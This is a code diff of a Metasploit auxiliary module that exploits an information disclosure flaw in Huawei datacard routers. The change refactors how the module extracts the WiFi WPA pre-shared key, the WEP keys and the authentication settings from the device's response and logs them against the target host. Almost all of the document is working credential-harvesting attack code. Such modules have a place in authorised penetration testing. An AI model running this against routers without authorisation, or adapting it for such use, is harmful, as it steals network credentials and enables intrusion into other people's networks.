@@ -39,6 +39,18 @@ class Metasploit3 < Msf::Auxiliary
     'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
   }
 
+  WIFI_INFO = {
+    'Wifi WPA pre-shared key'     => /<WifiWpapsk>(.*)<\/WifiWpapsk>/i,
+    'Wifi Auth mode'              => /<WifiAuthmode>(.*)<\/WifiAuthmode>/i,
+    'Wifi Basic encryption modes' => /<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i,
+    'Wifi WPA Encryption Modes'   => /<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i,
+    'Wifi WEP Key1'               => /<WifiWepKey1>(.*)<\/WifiWepKey1>/i,
+    'Wifi WEP Key2'               => /<WifiWepKey2>(.*)<\/WifiWepKey2>/i,
+    'Wifi WEP Key3'               => /<WifiWepKey3>(.*)<\/WifiWepKey3>/i,
+    'Wifi WEP Key4'               => /<WifiWepKey4>(.*)<\/WifiWepKey4>/i,
+    'Wifi WEP Key Index'          => /<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i
+  }
+
   def initialize(info={})
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
@@ -97,80 +109,29 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status('---===[ WiFi Key Details ]===---')
+    resp_body = res.body.to_s
+    log = ''
 
-    wifissid = get_router_ssid
-    if wifissid
-      print_status("WiFi SSID: #{wifissid}")
+    print_status('WiFi Key Details')
+
+    wifi_ssid = get_router_ssid
+    if wifi_ssid
+      print_status("WiFi SSID: #{wifi_ssid}")
+      log << "WiFi SSID: #{wifi_ssid}\n"
     end
 
-    # Grabbing the wifiwpapsk
-    if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
-      wifiwpapsk = $1
-      print_status("Wifi WPA pre-shared key: #{wifiwpapsk}")
+    WIFI_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+        log << "#{k}: #{info}\n"
+      end
     end
-
-    # Grabbing the WifiAuthmode
-    if res.body.match(/<WifiAuthmode>(.*)<\/WifiAuthmode>/i)
-      wifiauthmode = $1
-      print_status("Wifi Auth mode: #{wifiauthmode}")
-    end
-
-    # Grabbing the WifiBasicencryptionmodes
-    if res.body.match(/<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i)
-      wifibasicencryptionmodes = $1
-      print_status("Wifi Basic encryption modes: #{wifibasicencryptionmodes}")
-    end
-
-    # Grabbing the WifiWpaencryptionmodes
-    if res.body.match(/<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i)
-      wifiwpaencryptionmodes = $1
-      print_status("Wifi WPA Encryption Modes: #{wifiwpaencryptionmodes}")
-    end
-
-    # Grabbing the WifiWepKey1
-    if res.body.match(/<WifiWepKey1>(.*)<\/WifiWepKey1>/i)
-      wifiwepkey1 = $1
-      print_status("Wifi WEP Key1: #{wifiwepkey1}")
-    end
-
-    # Grabbing the WifiWepKey2
-    if res.body.match(/<WifiWepKey2>(.*)<\/WifiWepKey2>/i)
-      wifiwepkey2 = $1
-      print_status("Wifi WEP Key2: #{wifiwepkey2}")
-    end
-
-    # Grabbing the WifiWepKey3
-    if res.body.match(/<WifiWepKey3>(.*)<\/WifiWepKey3>/i)
-      wifiwepkey3 = $1
-      print_status("Wifi WEP Key3: #{wifiwepkey3}")
-    end
-
-    # Grabbing the WifiWepKey4
-    if res.body.match(/<WifiWepKey4>(.*)<\/WifiWepKey4>/i)
-      wifiwepkey4 = $1
-      print_status("Wifi WEP Key4: #{wifiwepkey4}")
-    end
-
-    # Grabbing the WifiWepKeyIndex
-    if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
-      wifiwepkeyindex = $1
-      print_status("Wifi WEP Key Index: #{wifiwepkeyindex}")
-    end
-
-    credentials = {
-      'Access Point'   => rhost,
-      'SSID'           => wifissid,
-      'WPA Key'        => wifiwpapsk,
-      '802.11 Auth'    => wifiauthmode,
-      'EncryptionMode' => wifiwpaencryptionmodes,
-      'WEP Key'        => wifiwepkey1
-    }
 
     report_note(
       :host => rhost,
-      :type => 'password',
-      :data => credentials
+      :type => 'wifi_keys',
+      :data => log
     )
   end
 
